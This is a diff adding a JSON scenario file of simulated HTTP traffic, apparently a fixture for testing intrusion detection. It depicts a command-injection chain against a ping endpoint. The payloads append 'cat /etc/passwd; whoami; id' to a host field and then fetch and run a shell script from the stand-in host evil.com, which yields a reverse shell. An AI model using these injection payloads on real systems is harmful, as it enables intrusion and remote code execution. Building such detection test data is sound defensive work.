@@ -1,0 +1,46 @@
+{
+  "scenario": "Command Injection Chain",
+  "description": "Multi-stage command injection leading to system compromise",
+  "connections": [
+    {
+      "src_ip": "10.0.1.100",
+      "src_port": 45300,
+      "dst_ip": "admin.company.com",
+      "dst_port": 80,
+      "protocol": "tcp",
+      "app_protocol": "http",
+      "messages": [
+        {
+          "direction": "request",
+          "sender_ip": "10.0.1.100",
+          "raw_data": "POST /system/ping HTTP/1.1\r\nHost: admin.company.com\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Basic YWRtaW46cGFzcw==\r\nContent-Length: 45\r\n\r\nhost=8.8.8.8; cat /etc/passwd; whoami; id"
+        },
+        {
+          "direction": "response",
+          "sender_ip": "admin.company.com",
+          "raw_data": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 412\r\n\r\nPING 8.8.8.8: 56 data bytes\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"
+        }
+      ]
+    },
+    {
+      "src_ip": "10.0.1.100",
+      "src_port": 45301,
+      "dst_ip": "admin.company.com",
+      "dst_port": 80,
+      "protocol": "tcp",
+      "app_protocol": "http",
+      "messages": [
+        {
+          "direction": "request",
+          "sender_ip": "10.0.1.100",
+          "raw_data": "POST /system/ping HTTP/1.1\r\nHost: admin.company.com\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Basic YWRtaW46cGFzcw==\r\nContent-Length: 67\r\n\r\nhost=127.0.0.1; wget http://evil.com/shell.sh -O /tmp/s.sh; bash /tmp/s.sh"
+        },
+        {
+          "direction": "response",
+          "sender_ip": "admin.company.com",
+          "raw_data": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 156\r\n\r\nPING 127.0.0.1: 56 data bytes\n--2024-01-15 14:30:12--  http://evil.com/shell.sh\nResolving evil.com... 203.0.113.5\nConnecting to evil.com:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 234 [application/x-sh]\nSaving to: '/tmp/s.sh'\nReverse shell established..."
+        }
+      ]
+    }
+  ]
+}
